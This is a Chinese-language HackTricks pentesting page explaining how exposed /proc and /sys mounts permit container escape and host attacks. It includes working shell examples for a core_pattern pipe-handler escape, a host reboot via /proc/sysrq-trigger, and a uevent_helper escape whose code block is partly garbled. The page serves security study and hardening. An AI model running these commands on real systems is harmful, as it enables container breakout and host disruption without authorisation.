# 敏感挂载点

{% hint style="success" %}
学习并练习AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习并练习GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享黑客技巧。

</details>
{% endhint %}

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

未经适当命名空间隔离的`/proc`和`/sys`的暴露会带来重大安全风险，包括增加攻击面和信息泄露。这些目录包含敏感文件，如果配置错误或被未经授权的用户访问，可能导致容器逃逸、主机修改或提供有助于进一步攻击的信息。例如，不正确地挂载`-v /proc:/host/proc`可能绕过AppArmor保护，因为其基于路径的特性，使`/host/proc`无保护。

**您可以在** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)** **找到每个潜在漏洞的更多详细信息。

## procfs漏洞

### `/proc/sys`

此目录允许通过`sysctl(2)`修改内核变量，并包含几个相关子目录：

#### **`/proc/sys/kernel/core_pattern`**

* 在[core(5)](https://man7.org/linux/man-pages/man5/core.5.html)中描述。
* 允许定义一个程序，在核心文件生成时使用前128个字节作为参数。如果文件以管道`|`开头，可能导致代码执行。
*   **测试和利用示例**：

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # 测试写入权限
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # 设置自定义处理程序
sleep 5 && ./crash & # 触发处理程序
```

#### **`/proc/sys/kernel/modprobe`**

* 在[proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)中详细描述。
* 包含内核模块加载器的路径，用于加载内核模块。
*   **检查访问权限示例**：

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # 检查对modprobe的访问权限
```

#### **`/proc/sys/vm/panic_on_oom`**

* 在[proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)中引用。
* 一个全局标志，控制当发生OOM条件时内核是崩溃还是调用OOM killer。

#### **`/proc/sys/fs`**

* 根据[proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)，包含有关文件系统的选项和信息。
* 写入权限可能导致对主机的各种拒绝服务攻击。

#### **`/proc/sys/fs/binfmt_misc`**

* 允许根据其魔术数字为非本机二进制格式注册解释器。
* 如果`/proc/sys/fs/binfmt_misc/register`可写，可能导致提权或获取root shell访问。
* 相关利用和解释：
* [通过binfmt\_misc实现的简易rootkit](https://github.com/toffan/binfmt\_misc)
* 深入教程：[视频链接](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### `/proc`中的其他内容

#### **`/proc/config.gz`**

* 如果启用了`CONFIG_IKCONFIG_PROC`，可能会显示内核配置。
* 对攻击者有用，以识别运行中内核中的漏洞。

#### **`/proc/sysrq-trigger`**

* 允许调用Sysrq命令，可能导致立即系统重启或其他关键操作。
*   **重启主机示例**：

```bash
echo b > /proc/sysrq-trigger # 重启主机
```

#### **`/proc/kmsg`**

* 显示内核环形缓冲区消息。
* 可帮助内核利用、地址泄漏和提供敏感系统信息。

#### **`/proc/kallsyms`**

* 列出内核导出的符号及其地址。
* 对于内核利用开发至关重要，特别是用于克服KASLR。
* 地址信息受`kptr_restrict`设置为`1`或`2`的限制。
* 详细信息请参阅[proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)。

#### **`/proc/[pid]/mem`**

* 与内核内存设备`/dev/mem`交互。
* 在历史上容易受到提权攻击的影响。
* 更多信息请参阅[proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)。

#### **`/proc/kcore`**

* 以ELF核心格式表示系统的物理内存。
* 读取可能泄漏主机系统和其他容器的内存内容。
* 大文件大小可能导致读取问题或软件崩溃。
* 详细用法请参阅[2019年转储/proc/kcore](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)。

#### **`/proc/kmem`**

* `/dev/kmem`的替代接口，表示内核虚拟内存。
* 允许读取和写入，因此可以直接修改内核内存。

#### **`/proc/mem`**

* `/dev/mem`的替代接口，表示物理内存。
* 允许读取和写入，修改所有内存需要解析虚拟到物理地址。

#### **`/proc/sched_debug`**

* 返回进程调度信息，绕过PID命名空间保护。
* 显示进程名称、ID和cgroup标识符。

#### **`/proc/[pid]/mountinfo`**

* 提供有关进程挂载命名空间中挂载点的信息。
* 显示容器`rootfs`或镜像的位置。

### `/sys`中的漏洞

#### **`/sys/kernel/uevent_helper`**

* 用于处理内核设备`uevents`。
* 写入`/sys/kernel/uevent_helper`可以在`uevent`触发时执行任意脚本。
*   **利用示例**： %%%bash

#### 创建一个有效载荷

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### 从容器的OverlayFS挂载中找到主机路径

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### 将uevent\_helper设置为恶意助手

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### 触发uevent

echo change > /sys/class/mem/null/uevent

#### 读取输出

cat /output %%%
#### **`/sys/class/thermal`**

* 控制温度设置，可能导致 DoS 攻击或物理损坏。

#### **`/sys/kernel/vmcoreinfo`**

* 泄露内核地址，可能危及 KASLR。

#### **`/sys/kernel/security`**

* 包含 `securityfs` 接口，允许配置类似 AppArmor 的 Linux 安全模块。
* 访问可能使容器禁用其 MAC 系统。

#### **`/sys/firmware/efi/vars` 和 `/sys/firmware/efi/efivars`**

* 提供与 NVRAM 中的 EFI 变量交互的接口。
* 配置错误或利用可能导致笔记本变砖或主机无法启动。

#### **`/sys/kernel/debug`**

* `debugfs` 为内核提供了一个“无规则”调试接口。
* 由于其不受限制的特性，存在安全问题的历史。

### 参考资料

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
学习并练习 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习并练习 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
